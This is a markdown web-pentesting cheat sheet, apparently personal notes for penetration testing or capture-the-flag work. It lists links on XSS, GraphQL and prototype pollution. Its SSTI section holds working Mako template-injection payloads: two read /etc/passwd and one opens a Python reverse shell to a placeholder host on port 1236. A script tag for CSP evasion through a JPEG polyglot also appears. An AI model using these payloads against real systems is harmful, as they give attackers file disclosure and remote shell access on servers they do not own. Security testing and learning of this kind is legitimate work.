# Web

## Resources
- [:alien: Revshells](https://www.revshells.com/)
- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology)

## SSTI
### Mako
```python
${4+4}
<%import os;x=os.popen('cat /etc/passwd').read()%>${x}
<%from pathlib import Path;x=Path('/etc/passwd').read_text()%>${x}
<%import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",1236));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);%>
```

## XSS
- [Hacktricks XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [CSP evasion with JPG polyglot](https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs)
  - [XSS jpg polyglot](https://infosecwriteups.com/exploiting-xss-with-javascript-jpeg-polyglot-4cff06f8201a)
  - [imgj_polygloter](https://github.com/s-3ntinel/imgjs_polygloter)
  - `<script charset="ISO-8859-1" type="text/javascript" src="/some/route"></script>`
- [CSP evasion with dangling markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)

## Misc
- [prototype pollution](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)

## Graphql
### References
- [Hacktricks Graphql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql#graphql)
- [jondow.eu/practical-graphql-attack-vectors](https://jondow.eu/practical-graphql-attack-vectors/)
- [graphql-common-vulnerabilities-how-to-exploit-them](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [common-security-test-cases-for-graphql-endpoints](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
- [ghostlulz.com/api-hacking-graphql](http://ghostlulz.com/api-hacking-graphql/)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [Portswigger graphql](https://portswigger.net/web-security/graphql)

## Foothold
  - SSTI
  - SQL injections
  - SSRF
  - XSS

